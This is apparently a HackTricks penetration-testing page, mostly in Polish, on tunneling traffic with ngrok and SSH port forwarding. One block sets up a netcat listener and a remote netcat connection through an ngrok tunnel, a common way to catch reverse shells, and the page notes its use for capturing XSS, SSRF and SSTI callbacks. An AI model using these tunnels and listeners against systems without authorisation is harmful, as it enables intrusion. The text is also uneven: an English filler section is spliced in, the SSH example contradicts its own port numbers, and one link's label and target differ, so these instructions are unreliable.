Aby tunelować ruch TCP, można użyć narzędzi takich jak `ngrok` lub `ssh` z przekierowaniem portów.

##### Użycie ngrok

[Ngrok](https://ngrok.com/) to popularne narzędzie do tworzenia bezpiecznych tuneli do localhostu. Udostępnia publiczny adres URL, który można użyć do uzyskania dostępu do lokalnej usługi z dowolnego miejsca.

Aby tunelować ruch TCP za pomocą ngrok, postępuj zgodnie z poniższymi krokami:

1. Pobierz i zainstaluj ngrok ze [strony oficjalnej](https://ngrok.com/download).
2. Uruchom ngrok, wykonując poniższą komendę:

   ```
   ngrok tcp <local-port>
   ```

   Zastąp `<local-port>` numerem portu usługi, którą chcesz tunelować.

3. Ngrok wygeneruje publiczny adres URL, który można użyć do uzyskania dostępu do lokalnej usługi. Adres URL zostanie wyświetlony w konsoli ngrok.

   ```
   Forwarding tcp://0.tcp.ngrok.io:<random-port> -> localhost:<local-port>
   ```

   Zastąp `<random-port>` przypisanym losowo numerem portu.

4. Użyj wygenerowanego adresu URL, aby uzyskać dostęp do lokalnej usługi z dowolnego miejsca.

##### Użycie ssh z przekierowaniem portów

Jeśli masz dostęp SSH do zdalnej maszyny, możesz użyć przekierowania portów SSH do tunelowania ruchu TCP.

Aby tunelować ruch TCP za pomocą SSH, postępuj zgodnie z poniższymi krokami:

1. Otwórz terminal i wykonaj poniższą komendę:

   ```
   ssh -L <local-port>:<remote-host>:<remote-port> <username>@<remote-host>
   ```

   Zastąp `<local-port>` numerem portu na twojej lokalnej maszynie, który chcesz przekierować, `<remote-host>` adresem IP lub nazwą hosta zdalnej maszyny, `<remote-port>` numerem portu na zdalnej maszynie i `<username>` swoją nazwą użytkownika SSH.

2. Wprowadź hasło SSH, gdy zostaniesz o to poproszony.

3. Po nawiązaniu połączenia SSH możesz uzyskać dostęp do zdalnej usługi, łącząc się z `localhost:<local-port>` na twojej lokalnej maszynie.

   Na przykład, jeśli przekierowałeś port 8080 na zdalnej maszynie na port 8888 na twojej lokalnej maszynie, możesz uzyskać dostęp do zdalnej usługi, otwierając `http://localhost:8080` w przeglądarce internetowej.
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Ujawnianie plików za pomocą protokołu HTTP

One common method of exposing files is by using the HTTP protocol. This technique involves hosting the files on a web server and making them accessible through a web browser.

To expose a file using HTTP, follow these steps:

1. Set up a web server: Start by setting up a web server on your machine or on a remote server. There are various web server software options available, such as Apache, Nginx, or IIS.

2. Configure the web server: Once the web server is installed, configure it to serve the files you want to expose. This typically involves specifying the directory where the files are located and setting up the appropriate permissions.

3. Start the web server: Start the web server and ensure that it is running correctly. You can usually access the web server's control panel or dashboard to verify its status.

4. Access the files: Once the web server is running, you can access the exposed files by entering the server's IP address or domain name in a web browser. The files will be served as web pages, allowing you to view or download them.

It's important to note that when exposing files using HTTP, anyone with the server's IP address or domain name can access the files. Therefore, it's crucial to properly secure the server and restrict access to authorized users only.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Podsłuchiwanie wywołań HTTP

*Przydatne przy XSS, SSRF, SSTI ...*
Bezpośrednio z stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunelowanie wewnętrznego serwisu HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Przykład prostej konfiguracji pliku ngrok.yaml

Otwiera 3 tunele:
- 2 TCP
- 1 HTTP z eksponowaniem statycznych plików z /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Inne narzędzia do sprawdzenia

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
